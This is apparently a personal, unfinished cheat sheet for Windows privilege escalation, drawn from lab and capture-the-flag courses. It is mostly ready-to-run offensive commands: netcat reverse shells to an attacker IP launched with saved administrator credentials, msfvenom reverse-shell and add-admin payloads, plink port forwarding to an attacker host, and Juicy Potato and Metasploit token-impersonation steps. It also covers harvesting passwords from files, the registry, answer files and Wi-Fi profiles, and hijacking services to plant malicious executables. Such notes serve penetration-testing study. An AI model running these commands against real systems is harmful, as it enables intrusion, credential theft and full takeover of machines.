# Windows Survey and Privilege Escalation (work in progress)

This checklist includes basic enumeration techniques using native commands and Powershell cmdlets, common enumeration scripts, and techniques used to escalate priveleges on windows machines.

Of note: 
* wmic = Windows Managmenet Instrumentatiom Commandline
* *Get* commmands are powershell cmdlets

## Automated Enumeration Scripts




#### System Information:
```
systeminfo
ver 
hostname

# only OS information 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# verbose hotfix (patch) info 
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn

# disk drives
wmic logicaldisk get caption,description,providername 
```
<br/>

#### Enviornment variables:
```
set

# powershell
Get-ChildItem Env: | ft Key,Value
```

View the current user's information:
```
# username
whoami
echo %username%
$env:UserName

# user details
whoami /all
net user <USERNAME>

# user privilages (looking for SeImperonsatePrivilege/SeAssignPrimaryToken or SeChangeNotifyPrivilege)
whoami /priv

# detailed account information and group memberships:
net user <USERNAME> 
```

Enumerate users and groups: 
```
# who else is logged in 
qwinsta

# local users
net user
net user <USERNAME>
Get-LocalUser

# domain users 
net user /domain 
net user <USERNAME> /domain

#search through user directories
tree /f /a C:\Users\<USERNAME>
Get-ChildItem C:\Users\<USERNAME> -Force

# search for files with alternate data streams (hidden data indicated by $DATA):
dir /R C:\Users\<USERNAME>
more <FILE_WITH_HIDDEN_DATA>

# local groups 
net localgroup
Get-LocalGroups

# users in the group
net localgroup <GROUP>
Get-LocalGroupMember <GROUP>

# domain groups 
net groups
net groups /domain

page 627
```
## Networking:
```
ipconfig
ipconfig /all
route print
arp -a
type C:\windows\system32\drivers\etc\networks
```
Display active TCP/UDP connections:
```
netstat -ano

# connections with executeanle 
netstat -bano
```
Conntections Explained (sushant747)
Local address 0.0.0.0
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

Local address 127.0.0.1
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us!

Local address 192.168.1.9
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!

Firewall Status:
```

# windows defender
sc query windefend

# firewall
netsh firewall show state
netsh firewall  show config

netsh advfirewall show allprofiles
netsh advfirewall show global

```


## Password Hunting:

Look for stored credentials.
```
cmdkey /list
```
If there are stored credential for a user with adminstrative privileges, use runas to execute commands like kicking off a netcat reverse shell:
```
runas /savecred /user:ACCESS\Administrator "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
Find the string *password* in certain types of files: 
```
# current directory
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config


# look through payloadallthethings

```
Windows answer file contains setting definitions and values to use during Windows Setup (including passwords):
```
1. Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml
2. Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.

#base64 decode
echo [copied base64] | base64 -d
```
Wifi passwords:
```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear | findstr "Key Content"
```


Registry:

```
# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

Search the HIVES:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


Running proceeses:
```
wmic process list brief
sc queryex type= service 
sc queryex type= service  | finstr "SERVICE NAME"
```
Running services:
```
net start
```

Set up port forwarding for services only available on the local machine:
```
# Port forward using plink
plink.exe -l <ATTACKER_USERNAME> -pw <ATTACKER_PASSOWRD> -R <ATTACKER_PORT>:127.0.0.1:<VICTIM_PORT> <ATTACKER_IP>

#enusre to download the latest version of plink
#The attacker port should provide access to the service from the attacker port on the attacker machine
```

#### WSL
```
where /R C:\Windows bash.exe 
where /R C:\Windows wsl.exe 
```
Determine if the bash.exe is run as root

wsl.exe whoami 

Open a bash terminal using the subsytem
```
bash.exe 

# spawn a tty shell 
python -c 'import pty; pty.spawn("/bin/bash")'
```

Standard linux enumeration

```
pwd 
id 
history
```
#### Token Impersonstion (Payloadallthethings)

Temporary keys that give you access to a system/networj without haveing to provide credentials each time you access a file (think of these as cookies for a computer)
Types of tokens
Delegate - created for logging into a machine using RDP
Impersonate - "non-interactive" such as attaching a network drive or a doman login script

Check for privs if not done already
```
whoami /priv
```
Can also run window-exploit suggester and see if there are any vulnerabilites to potato attacks

#### Metasploit Token Impersonation (Potato Attack)

references: 

First must get a meterpreter shell on the target machine. The nverify the privs"
```
meterpreter > getprivs
```

Now see if the machine is vulnerable to any of the built in potato attacks:
```
meterpreter > run post/multi/recon/local_exploit_suggester

# should see one of these in the output:
[+] exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable
[+] exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
```
Background the current meterpreter sessions and setup for the potato attack:
```
meterpreter > background

# specify the exploit
use exploit/windows/local/ms16_075_reflection

# choose payload
set payload windows/x64/meterpreter/reverse_tcp

# final options
set LPORT <PORT>
set LHOST <IP_ADDRESS>
set SESSION <SESSION_#>

run
```

In meterpreter, load incognito mode and see if there is an admin account we can impersonate 
```
meterpreter > incognito

meterpreter > list tokens -u
```

Look for *Impersonation Tokens Available* and use the account you wan to impersonate:
```
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```
Now you should have a session with system privs 

#### Tater.ps1

need link to tater.ps1

1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators

#### Manual Method

reference: https://0xrick.github.io/hack-the-box/conceal/

Downluad the juicy potato [executable](https://github.com/ohpe/juicy-potato/releases) and move it to the target machine.  You will also need to have netcat on the target machine to get the reverse shell.

Create a bat reverse shell on the target machine:
```
echo nc.exe -e cmd.exe <IP_ADDRESS> <PORT> > rev.bat
```
We need to know the version of this windows to pick the right clsid.  Ensure to run *systeminfo* to get this.  Now check for the corresponding CLSID [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID).  With all of that we can execute the reverse shell (ensure listener is up on the attacker machine):
```
JuicyPotato.exe -p rev.bat -l <PORT> -t * -c <CLSID>
```




## getsystem

reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

getsystem uses Meterpreter elevates you from a local administrator to the SYSTEM user using named pipe inpersonation (one memory and one on disk) or token duplication (must have SeDebugPrivileges enabled).

```
meterpreter > getsystem
```

<br /> 

### Autorun Escalation
Reference - https://tryhackme.com/room/windowsprivescarena

Looking for executables that are autmoatillcay run by the system and and do we have permission to change those executeables.  These are automatically run using the registry, task scheduler, or the startup directory.

#### Method 1

Check the system for Autoruns executable:
```
where /R C:\ Autoruns*
```
With a RDP session, open Up Autoruns and look for executables that are automatically started up:
```
<PATH_TO_AUTORUNS>\Autoruns(64).exe>
```
Use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to see whop has write abilities to the files in the directory where the executatle is located:
```
accesschk64.exe -wvu "<DIRECTORY>"

# Looking for 
RW Everyone
      FILE_ALL_ACCESS
```
If you have have read/write access to the executable

#### Method 2

If no RDP session, use Powerup to identify modifiable registry autoruns and configs:
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Look under this section:
```
[*] Checking for modifiable registry autoruns and configs
```

Create  a reverse shell that will impersonate the executable
```
msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] lport=<PORT>-f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Now move this file onto target and replace the good executable with your malicious executable.  Once the conditions are met (login, etc.) your malicous executable will kick off.

## AlwaysInstallElevated 

*need RDP session*
Configure windos to install msi packages with elevated privileges (admin user).  First check to see if this is already enabled ( “AlwaysInstallElevated” value is 1)
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# command output
AlwaysInstallElevated  REG_DWORD  0x1
```
#### Method 1

Use PowerUP
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look ofr this output in the survey:
```
{*} Checking for AlwaysInstallElevated registry key...
```
If it came back with a yes, create a malicous msi package:
```
Write-UserAddMSI
```
Now rin the malicious MSI and create a new user with administrative privileges.  Now you can login with the new user!

#### Method 2

Create a malicous msi with msfvenom:
```
msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] lport=4444 -f msi -o setup.msi
```
setup listener:
```
nc -nlvp <PORT>
```
Transfer the file over to the target machine and run it to catch a reverse shell

#### Method 3

User windows post exploitation script to elevate privs if you have a meterpreter shell on the box:
```
use exploit/windows/local/always_install_elevated
set session <SESSION_#>
run
```


### Services Escalation - regsvc ACL


See if we have full control of a registry key by checking the ACL for it:
```
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# looking for output with "FullControl"
```
If we have control of the service, se can add and executable to the service and start the service.  
referemce the cpurse for executable (add to git with command to compile)

Add executable to to the service, adding to the imagepath subkey adding path to the drivers image file 
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\<MALICIOUS_EXE> /f
```
Now start the service:
```
sc start regsvc
```

### Service Escalation via Executable Files
Use PowerUP
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```

Now look ofr this output in the survey:
```
{*} Checking service executable and argument permissions...
```
Look at the *Modifiable File* and *Path* of the the executable. You can use accesscheck to verify permissions:
```
accesschk64.exe -wvu "<PATH_TO_EXE>"

# Looking for 
RW Everyone
      FILE_ALL_ACCESS
```
Now replace the exe with a mlicious exe (windows_services.exe):
```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```
Now start the service which should execute the exe as nt/authroituy system:
```
sc start <service>
```

### Startup Applications
Use icacls to see if you hace rw to the startup directory
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Looking for <F> which means full access
```
Now create a reverse shell exe to be placed in the startup directory:

Create  a reverse shell that will impersonate the executable
```
msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] lport=<PORT>-f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Place the file in the startup directory, once the admin logs in, you will get a reverse shell (ensure listener is up)

### DLL Hijacking
DLLs are similar to .so files which serve as libraries which run with executables.  Hijacking is looking for an instance where a service is looking for a dll that does not exist and is/should be in a path that is writeable.

how to search for it other than procmon???? Procmon???

### Binary Paths

Method 1 Use PowerUP w
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look ofr this output in the survey:
```
{*} Checking service permissions...
```

Verify with access check:
```
# show all services where everyone can read/write
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *

# details for any service that was found
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc <SERVICE>

# looking for SERVICE_CHANGE_CONFIG” permission for everyone
```
Since we have the SERVICE_CHANGE_CONFIG permission, can edit the BINARY_PATH_NAME and run a command, such as add a user to the administrators group:
```
sc config <SERVICE> binpath= "net localgroup administrators <USERNAME> /add"

# restart the service so it runs the command
sc stop <SERVICE>
sc stop <SERVICE> 

# verify the user has been added to the administrators group
net localgroup administrators
```
### Unquoted Service Path  Paths

Occurs when a service executables path contains a psace and is not enclosed in quoations marks. 

Method 1 Use PowerUP (can also use Winpeas)
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look ofr this output in the survey:
```
{*} Checking for unquoted service...
```
Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes. place a malicious executeable somewhere in th path.

Example, if the path of the exe is C:\Progam Files\service.exe, place a malicious executeable as C:\Progam.exe 

Generate a malicious exe that will create add a user to the administrator group:
```
msfvenom -p windows/exec CMD='net localgroup administrators <USER> /add' -f exe-service -o program.exe
```
Place the exe in the path the of the legitimate executeable.  Now restart the service which should run the malicous executable
```
# check the status of the service
sc query <SERVICE>

# restart if needed
sc stop <SERVICE>
sc start <SERVICE> 

# verify the cahnges took effect
net localgroup administrators
```

## Bloodhound

Also reffered to as walking the dog...
```
#install
sudo apt install bloodhound 

#start bloodhound
bloodhound

#start neo4
neo4j console

#run sharphound on the target windows machine
./Sharphound.exe

#copy the zip file to your attacking machine, drag and drop into neo4j
```
Reference Sauna HTB machine


### Automated Enumeration Tools
- [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- Windows Priv Esc Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
- Sherlock: https://github.com/rasta-mouse/Sherlock
- Watson: https://github.com/rasta-mouse/Watson
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS: https://github.com/411Hall/JAWS
- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- Metasploit Local Exploit Suggester: https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
```
run post/multi/recon/local_exploit_suggester
```
- WinEnum.ps1
- Seatbelt: https://github.com/GhostPack/Seatbelt
- SharpUp: https://github.com/GhostPack/SharpUp


### runas

Look for stored credentials.
```
cmdkey /list
```
Chekthe full path of runas and use as needed 
```
where /R C:\ runas.exe
```
If there are stored credential for a user with adminstrative privileges, use runas to execute commands like kicking off a netcat reverse shell:
```
runas /savecred /user:ACCESS\Administrator "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
If you have credentials for an administrator.  Using runas with a provided set of credential to execute a command as that user:
```
runas /env /noprofile /user:<USERNAME> <PASSWORD> "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
### Techniques 

UAC Bypass - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
Juicy Potato 
* must tell which CLSID to run or let it choose for you which may work 
** well known list for each OS - https://github.com/ohpe/juicy-potato/tree/master/CLSID

icacls - what files do we have read/write/execute abilites?


### Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits

### Transferring Files

Getting files onto the target machine:
```
# grab file from a webserver
certutil -urlcache -f http://<IP_ADDR>/<FILE> <OUTPUT_FILE>
```

Setup FTP server on attacking machine:
```
# install the module
pip3 install pyftpdlib

# start up the ftp server
python3 -m pyftpdlib -p 21 --write


```
### Referenced Checklists
1. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
2. Udemy Windows Privilege Escalation for Beginners Course

Hiding data inside of files:
Data Streams - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
